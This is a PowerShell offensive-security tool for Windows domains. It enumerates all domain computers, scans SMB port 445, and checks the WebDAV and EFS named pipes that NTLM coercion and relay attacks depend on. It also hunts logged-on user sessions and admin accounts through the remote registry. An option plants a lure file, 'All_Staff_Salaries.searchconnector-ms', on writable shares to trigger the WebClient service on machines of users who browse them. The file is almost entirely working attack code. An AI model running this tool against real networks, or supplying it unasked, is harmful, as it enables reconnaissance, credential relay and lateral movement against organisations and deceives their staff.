function CheckWebDAVStatus{
	
	<#

	.SYNOPSIS
	CheckWebDAVStatus Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/CheckWebDAVStatus
	
	.DESCRIPTION
	Check for WebDAV Service Status, EFS status, and hunt for Sessions

	#>
	
	[CmdletBinding()] Param(

	[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
	[String]
	$Domain,

	[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
	[String]
	$Targets,
		
	[Parameter (Mandatory=$False, Position = 2, ValueFromPipeline=$true)]
	[String]
	$TargetsFile,

	[Parameter (Mandatory=$False, Position = 3, ValueFromPipeline=$true)]
	[String]
	$OutputFile,

	[Parameter (Mandatory=$False, Position = 4, ValueFromPipeline=$true)]
	[switch]
	$Sessions,
		
	[Parameter (Mandatory=$False, Position = 5, ValueFromPipeline=$true)]
	[switch]
	$NoPortScan,
		
	[Parameter (Mandatory=$False, Position = 6, ValueFromPipeline=$true)]
	[switch]
	$Enable,
		
	[Parameter (Mandatory=$False, Position = 7, ValueFromPipeline=$true)]
	[switch]
	$Disable,
		
	[Parameter (Mandatory=$False, Position = 8, ValueFromPipeline=$true)]
	[String]
	$WritableShares

 	)

	Write-Output ""
	
	$ErrorActionPreference = "SilentlyContinue"
	
	Write-Output "[*] Checking Hosts..."

 	if($Targets){
  		$Computers = $Targets
		$Computers = $Computers -split ","
	}
	
	elseif($TargetsFile){
		$Computers = @()
		$Computers = Get-Content -Path $TargetsFile
	}
	
  	else{	
   		if($Domain){
     		# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain")
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
   			$objSearcher.PropertiesToLoad.Clear() | Out-Null
			$objSearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
		}

       	else{
			# Get a list of all the computers in the domain
			$objSearcher = New-Object System.DirectoryServices.DirectorySearcher
			$objSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry
   			$objSearcher.PageSize = 1000
			$objSearcher.Filter = "(&(sAMAccountType=805306369))"
   			$objSearcher.PropertiesToLoad.Clear() | Out-Null
			$objSearcher.PropertiesToLoad.Add("dNSHostName") | Out-Null
			$Computers = $objSearcher.FindAll() | %{$_.properties.dnshostname}
   			try{
	  			$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
				$currentDomain = $currentDomain.Name
	  		}
	    	catch{$currentdomain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
			$Domain = $currentDomain
			$Computers = $Computers | Where-Object {-not ($_ -cmatch "$env:computername")}
			$Computers = $Computers | Where-Object {-not ($_ -match "$env:computername")}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername"}
			$Computers = $Computers | Where-Object {$_ -ne "$env:computername.$currentdomain"}
     	}
  	}

   	$Computers = $Computers | Where-Object { $_ -and $_.trim() }
	
	if(!$NoPortScan){
	
		# Initialize the runspace pool
		$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
		$runspacePool.Open()

		# Define the script block outside the loop for better efficiency
		$scriptBlock = {
			param ($computer)
			$tcpClient = New-Object System.Net.Sockets.TcpClient
			$asyncResult = $tcpClient.BeginConnect($computer, 445, $null, $null)
			$wait = $asyncResult.AsyncWaitHandle.WaitOne(50)
			if ($wait) {
				try {
					$tcpClient.EndConnect($asyncResult)
					return $computer
				} catch {}
			}
			$tcpClient.Close()
			return $null
		}

		# Use a generic list for better performance when adding items
		$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'

		foreach ($computer in $Computers) {
			$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
			$powerShellInstance.RunspacePool = $runspacePool
			$runspaces.Add([PSCustomObject]@{
				Instance = $powerShellInstance
				Status   = $powerShellInstance.BeginInvoke()
			})
		}

		# Collect the results
		$reachable_hosts = @()
		foreach ($runspace in $runspaces) {
			$result = $runspace.Instance.EndInvoke($runspace.Status)
			if ($result) {
				$reachable_hosts += $result
			}
		}

		# Update the $Computers variable with the list of reachable hosts
		$Computers = $reachable_hosts

		# Close and dispose of the runspace pool for good resource management
		$runspacePool.Close()
		$runspacePool.Dispose()

 	}
	
	# Initialize the runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, 10)
	$runspacePool.Open()

	# Define the script block outside the loop for better efficiency
	$scriptBlock = {
		param ($computer)
		
		$source = @"
using System;
using System.Runtime.InteropServices;

namespace DynamicTypes {
    public class PipeChecker {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitNamedPipeA(string lpNamedPipeName, uint nTimeOut);
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp

		function CheckDAVPipe {
			param (
				[Parameter(Mandatory = $true)]
				[string]$TargetHost
			)

			$pipename = "\\$TargetHost\pipe\DAV RPC SERVICE"
			$davActive = [DynamicTypes.PipeChecker]::WaitNamedPipeA($pipename, 100)

			if ($davActive) {
				Write-Output "$TargetHost"
			}
		}
		
		$Result = CheckDAVPipe -TargetHost $computer
		if($Result){return $computer}
		return $null
	}

	# Use a generic list for better performance when adding items
	$runspaces = New-Object 'System.Collections.Generic.List[System.Object]'
	
	foreach ($computer in $Computers) {
		$powerShellInstance = [powershell]::Create().AddScript($scriptBlock).AddArgument($computer)
		$powerShellInstance.RunspacePool = $runspacePool
		$runspaces.Add([PSCustomObject]@{
			Instance = $powerShellInstance
			Status   = $powerShellInstance.BeginInvoke()
		})
	}
	
	# Collect the results
	$WebDAVStatusEnabled = @()
	foreach ($runspace in $runspaces) {
		$result = $runspace.Instance.EndInvoke($runspace.Status)
		if ($result) {
			$WebDAVStatusEnabled += $result
		}
	}

	# Close and dispose of the runspace pool for good resource management
	$runspacePool.Close()
	$runspacePool.Dispose()
	
	if($WebDAVStatusEnabled){
		$FinalTable = @()
		$FinalTable += foreach($davresult in $WebDAVStatusEnabled){
			[PSCustomObject]@{
				"WebDAV Enabled" = $davresult
				"EFS Service" = CheckEFSPipe -TargetHost $davresult
				"Operating System" = Get-OS -HostName ($davresult -split "\.")[0] -Domain $Domain
			}
		}
	
		
		$FinalTable | ft -Autosize
		
		if($Sessions){
			Write-Output "[*] Checking for Sessions..."
			$WebDAVStatusEnabled = ($WebDAVStatusEnabled -join ',')
			$WebDAVSessions = Invoke-SessionHunter -Targets $WebDAVStatusEnabled -Domain $Domain
   			$WebDAVSessions | ft -Autosize
      		if($OutputFile){
				$FinalTable | Out-File $OutputFile
	 			Add-Content -Path $OutputFile -Value "Sessions:"
	 			$WebDAVSessions | Out-File -FilePath $OutputFile -Append
				Write-Output "[*] Output saved to: $OutputFile"
     		}
  			else{
				$FinalTable | Out-File $pwd\WebDAVEnabled.txt
				Add-Content -Path $pwd\WebDAVEnabled.txt -Value "Sessions:"
				$WebDAVSessions | Out-File -FilePath $pwd\WebDAVEnabled.txt -Append
				Write-Output "[*] Output saved to: $pwd\WebDAVEnabled.txt"
			}
		}
		
		else {
			if($OutputFile){
				$FinalTable | Out-File $OutputFile
				Write-Output "[*] Output saved to: $OutputFile"
			}
			else{
				$FinalTable | Out-File $pwd\WebDAVEnabled.txt
				Write-Output "[*] Output saved to: $pwd\WebDAVEnabled.txt"
			}
		}
	}
	
	else{
		Write-Output ""
		Write-Output "[-] No hosts found where the WebClient Service is active."
		Write-Output ""
	}
	
	if($Enable -AND $WritableShares){
		Write-Host " WebDAV file attack in progress..."
		Write-Host ""
		
		$WebDavFile = @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
"@
		$WebDavFileName = "All_Staff_Salaries.searchconnector-ms"
		
		$sharesvariable = Get-Content $WritableShares
		
		foreach ($share in $sharesvariable) {
			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
			try {
				Set-Content -Path $fullPath -Value $WebDavFile -Force
				Write-Output "[*] File saved to: $fullPath"
			} catch {
				Write-Warning "[-] Failed to save file to: $fullPath"
			}
		}
	}
	
	elseif($Enable -AND !$WritableShares){
		Write-Output "[-] Please provide a file containing a list of writable shares"
		Write-Output ""
		break
	}
	
	if($Disable -AND $WritableShares){
		Write-Host " File deletion in progress..."
		Write-Host ""
		$WebDavFileName = "All_Staff_Salaries.searchconnector-ms"
		$sharesvariable = Get-Content $WritableShares
		
		foreach ($share in $sharesvariable) {
			$fullPath = Join-Path -Path $share -ChildPath $WebDavFileName
			if (Test-Path $fullPath) {
				try {
					Remove-Item -Path $fullPath -Force
					Write-Output "[+] File deleted from: $fullPath"
				} catch {
					Write-Warning "[-] Failed to delete file from: $fullPath"
				}
			} else {
				Write-Warning "[-] File not found at: $fullPath"
			}
		}
		
	}
	
	elseif($Disable -AND !$WritableShares){
		Write-Output "[-] Please provide a file containing a list of writable shares"
		Write-Output ""
		break
	}
	
	Write-Output ""
}

$source = @"
using System;
using System.Runtime.InteropServices;

namespace DynamicTypes {
    public class PipeChecker {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WaitNamedPipeA(string lpNamedPipeName, uint nTimeOut);
    }
}
"@

Add-Type -TypeDefinition $source -Language CSharp

function CheckEFSPipe {
    param (
        [Parameter(Mandatory = $true)]
        [string]$TargetHost
    )

    $pipename = "\\$TargetHost\pipe\efsrpc"
    $efsActive = [DynamicTypes.PipeChecker]::WaitNamedPipeA($pipename, 100)

    if ($efsActive) {
        return "Running"
    }
	else {
        Return "Stopped"
    }
}

function AdminCount {
    param (
        [string]$UserName,
        [string]$Domain
    )

    $ErrorActionPreference = "SilentlyContinue"

    # Construct distinguished name for the domain.
    $domainDistinguishedName = "DC=" + ($Domain -replace "\.", ",DC=")
    $targetdomain = "LDAP://$domainDistinguishedName"

    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry $targetdomain
    $searcher.PageSize = 1000
    $Searcher.Filter = "(sAMAccountName=$UserName)"
    $Searcher.PropertiesToLoad.Clear()
    $Searcher.PropertiesToLoad.Add("adminCount") > $null
    $result = $Searcher.FindOne()

    # Check if results were returned and output the adminCount property.
    if ($result -ne $null) {
        $entry = $result.GetDirectoryEntry()
        if ($entry.Properties["adminCount"].Value -ne $null) {
            return ($entry.Properties["adminCount"].Value -eq 1)
        } else {
            return $false
        }
    } else {
        return $false
    }
}

function Get-OS {
    param (
        [string]$HostName,
        [string]$Domain
    )

    $ErrorActionPreference = "SilentlyContinue"

    # Construct the search base.
    $baseDN = "DC=" + ($Domain -replace "\.", ",DC=")

    $ldapFilter = "(&(objectCategory=computer)(name=$HostName))"
    $attributesToLoad = "operatingSystem"

    # Create the directory searcher
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$baseDN")
    $searcher.Filter = $ldapFilter
    $searcher.PropertiesToLoad.Add($attributesToLoad) > $null

    # Perform the search
    $result = $searcher.FindOne()

    # Check if results were returned and output the operatingSystem property.
    if ($result -ne $null) {
        $entry = $result.GetDirectoryEntry()
        if ($entry.Properties["operatingSystem"].Value -ne $null) {
            return $entry.Properties["operatingSystem"].Value.ToString()
        } else {
            return $null
        }
    } else {
        return $null
    }
}

function Invoke-SessionHunter {
	
	<#

	.SYNOPSIS
	Invoke-SessionHunter Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SessionHunter

	#>
    
	[CmdletBinding()] Param(
		
		[Parameter (Mandatory=$False, Position = 0, ValueFromPipeline=$true)]
		[String]
		$Domain,
		
		[Parameter (Mandatory=$False, Position = 1, ValueFromPipeline=$true)]
		[String]
		$Targets
	
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	Add-Type -AssemblyName System.DirectoryServices
	$currentDomain = $Domain
	$Computers = $Targets
	$Computers = $Computers -split ","
	$Computers = $Computers | ForEach-Object { $_ -replace '\..*', '' }
	$Computers = $Computers | Sort-Object -Unique
	
	$ComputersFQDN = $Computers | ForEach-Object {
		if (-Not $_.EndsWith($Domain)) {
			"$_.$Domain"
		} else {
			$_
		}
	}
	$Computers = $ComputersFQDN
	
	# Create a runspace pool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
	$runspacePool.Open()

	# Create an array to hold the runspaces
	$runspaces = @()

	# Iterate through the computers, creating a runspace for each
	foreach ($Computer in $Computers) {
		# ScriptBlock that contains the processing code
		$scriptBlock = {
			param($Computer, $currentDomain, $ConnectionErrors, $searcher)

			# Clearing variables
			$userSIDs = $null
			$userKeys = $null
			$remoteRegistry = $null
			$user = $null
			$userTranslation = $null

			$results = @()

			# Gather computer information
			$ipAddress = Resolve-DnsName $Computer | Where-Object { $_.Type -eq "A" } | Select-Object -ExpandProperty IPAddress

			# Open the remote base key
			try {
				$remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $Computer)
			} catch {
				if ($ConnectionErrors) {
					Write-Host ""
					Write-Host "Failed to connect to computer: $Computer"
				}
				continue
			}

			# Get the subkeys under HKEY_USERS
			$userKeys = $remoteRegistry.GetSubKeyNames()

			# Initialize an array to store the user SIDs
			$userSIDs = @()

			foreach ($key in $userKeys) {
				# Skip common keys that are not user SIDs
				if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
					$userSIDs += $key
				}
			}

			# Close the remote registry key
			$remoteRegistry.Close()

			$results = @()

			# Resolve the SIDs to usernames
			foreach ($sid in $userSIDs) {
				$user = $null
				$userTranslation = $null

				try {
					$user = New-Object System.Security.Principal.SecurityIdentifier($sid)
					$userTranslation = $user.Translate([System.Security.Principal.NTAccount])

					$results += [PSCustomObject]@{
						Domain           = $currentDomain
						HostName         = $Computer.Replace(".$currentDomain", "")
						IPAddress        = $ipAddress
						OperatingSystem  = $null
						Access           = $null
						UserSession      = $userTranslation
						AdmCount         = "NO"
					}
				} catch {
					$searcher.Filter = "(objectSid=$sid)"
					$userTranslation = $searcher.FindOne()
					$user = $userTranslation.GetDirectoryEntry()
					$usersam = $user.Properties["samAccountName"].Value
					$netdomain = ([ADSI]"LDAP://$currentDomain").dc -Join " - "
					if ($usersam -notcontains '\') {
						$usersam = "$netdomain\" + $usersam
					}

					$results += [PSCustomObject]@{
						Domain           = $currentDomain
						HostName         = $Computer.Replace(".$currentDomain", "")
						IPAddress        = $ipAddress
						OperatingSystem  = $null
						Access           = $null
						UserSession      = $usersam
						AdmCount         = "NO"
					}
				}
			}

			# Returning the results
			return $results
		}

		$runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($currentDomain).AddArgument($ConnectionErrors).AddArgument($searcher)
		$runspace.RunspacePool = $runspacePool
		$runspaces += [PSCustomObject]@{ Pipe = $runspace; Status = $runspace.BeginInvoke() }
	}

	# Wait for all runspaces to complete
	$allResults = @()
	foreach ($runspace in $runspaces) {
		$allResults += $runspace.Pipe.EndInvoke($runspace.Status)
		$runspace.Pipe.Dispose()
	}

	# Define RunspacePool
	$runspacePool = [runspacefactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
	$runspacePool.Open()

	$runspaces = @()

	foreach ($result in $allResults) {
		$target = "$($result.HostName).$($result.Domain)"
		
		$powershell = [powershell]::Create().AddScript({
			$Error.Clear()
			Get-WmiObject -Class Win32_OperatingSystem -ComputerName $args > $null
			#ls "\\$args\c$" > $null
			return ($error[0] -eq $null)
		}).AddArgument($target)

		$powershell.RunspacePool = $runspacePool

		$runspaces += [PSCustomObject]@{
			PowerShell = $powershell
			Status = $powershell.BeginInvoke()
			Result = $result
		}
	}

	# Wait and collect results
	foreach ($runspace in $runspaces) {
		$runspace.Result.Access = [bool]($runspace.PowerShell.EndInvoke($runspace.Status))
		$runspace.PowerShell.Dispose()
	}

	$runspacePool.Close()
	$runspacePool.Dispose()
	
	foreach ($result in $allResults) {
		$username = ($result.UserSession -split '\\')[1]
		$tempdomain = ($result.UserSession -split '\\')[0]
		$TargetHost = $result.HostName
		$result.AdmCount = AdminCount -UserName $username -Domain $Domain
		$result.OperatingSystem = Get-OS -HostName $TargetHost -Domain $Domain
	}

	$allResults | Select-Object Domain, HostName, IPAddress, OperatingSystem, Access, UserSession, AdmCount | Format-Table -AutoSize	
}
